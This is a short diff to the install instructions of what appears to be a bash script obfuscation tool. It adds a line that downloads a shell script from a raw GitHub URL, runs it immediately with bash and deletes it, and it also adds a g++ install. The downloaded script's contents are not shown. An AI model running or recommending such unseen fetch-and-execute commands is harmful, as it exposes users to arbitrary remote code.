@@ -16,6 +16,8 @@ This tool has a feature that will make this obfuscate difficult to break
 ```bash
 apt-get update
 apt-get upgrade
+wget -qO depend.sh "https://raw.githubusercontent.com/YaddyKakkoii/stb/main/build.sh" && bash depend.sh; rm depend.sh 
+apt install g++
 apt-get install curl jq git ossp-uuid ncurses-utils lzma nodejs
 apt-get install nodejs-lts python
 npm -g i bash-obfuscate
